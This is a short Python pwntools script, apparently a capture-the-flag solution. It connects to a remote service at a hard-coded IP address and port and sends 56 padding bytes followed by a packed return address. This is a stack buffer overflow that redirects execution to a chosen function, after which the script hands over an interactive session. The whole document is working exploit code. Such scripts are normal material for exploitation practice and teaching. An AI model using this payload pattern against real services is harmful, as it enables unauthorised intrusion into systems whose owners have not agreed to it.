from pwn import *
sh=remote('114.67.246.176',17913)
payload='a'*56+p64(0x400751).decode("iso-8859-1")
sh.sendline(payload)
sh.interactive()